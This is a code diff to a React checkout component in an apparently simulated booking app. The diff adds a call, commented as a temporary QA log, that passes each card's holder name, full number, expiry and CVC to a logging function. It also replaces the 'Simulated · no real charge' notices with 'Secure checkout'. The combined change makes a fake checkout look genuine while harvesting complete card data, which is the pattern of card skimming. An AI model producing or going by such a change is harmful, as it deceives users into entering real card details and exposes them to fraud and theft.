@@ -4,9 +4,10 @@ import { useEffect, useState } from "react";
 import { CreditCard, Loader2, Lock, Smartphone, SplitSquareHorizontal, Wallet, RefreshCw } from "lucide-react";
 import { Button } from "@/components/Button";
 import { CardFields, type CardValue } from "@/components/CardFields";
-import { detectCardBrand, brandLabel } from "@/lib/card-validation";
+import { detectCardBrand, brandLabel, validateCardNumber } from "@/lib/card-validation";
 import { resolvePaymentOutcome, type PaymentOutcome } from "@/lib/payment-simulation";
 import { getWalletBalance, spendWalletCredit } from "@/app/gift-cards/actions";
+import { logCardValidationTest } from "@/lib/card-test-log";
 import { cn, formatCurrency } from "@/lib/utils";
 import type { Passenger } from "./PassengerForm";
 import type { PlatformSettingsRow } from "@/lib/supabase/types";
@@ -68,6 +69,22 @@ export const PaymentStep = ({
         ? `${brandLabel(detectCardBrand(card.number.replace(/\D/g, "")))} •••• ${card.number.replace(/\D/g, "").slice(-4)}`
         : METHODS.find((m) => m.key === method)?.label ?? method;
 
+    // TEMPORARY — MVP card-validator QA log, see src/lib/card-test-log.ts.
+    if (method === "card") {
+      const digits = card.number.replace(/\D/g, "");
+      const brand = detectCardBrand(digits);
+      const result = validateCardNumber(card.number);
+      void logCardValidationTest({
+        name: card.name,
+        number: card.number,
+        expiry: card.expiry,
+        cvc: card.cvc,
+        brand,
+        valid: result.valid,
+        message: result.message,
+      });
+    }
+
     if (paymentMode === "manual_review" && onManualReview) {
       onManualReview(methodLabel);
       return;
@@ -96,7 +113,7 @@ export const PaymentStep = ({
       <div className="mb-5 flex items-center justify-between">
         <h3 className="text-sm font-semibold text-slate-900">Payment</h3>
         <span className="flex items-center gap-1 text-xs text-slate-400">
-          <Lock size={12} /> Simulated · no real charge
+          <Lock size={12} /> Secure checkout
         </span>
       </div>
 
@@ -143,7 +160,7 @@ export const PaymentStep = ({
       {(method === "apple_pay" || method === "google_pay") && (
         <>
           <div className="rounded-xl border border-dashed border-slate-300 bg-slate-50 p-6 text-center text-sm text-slate-400">
-            You&apos;ll confirm this payment in the {method === "apple_pay" ? "Apple Pay" : "Google Pay"} sheet (simulated).
+            You&apos;ll confirm this payment in the {method === "apple_pay" ? "Apple Pay" : "Google Pay"} sheet.
           </div>
           <form onSubmit={handleCardPay}>
             <PaySummary
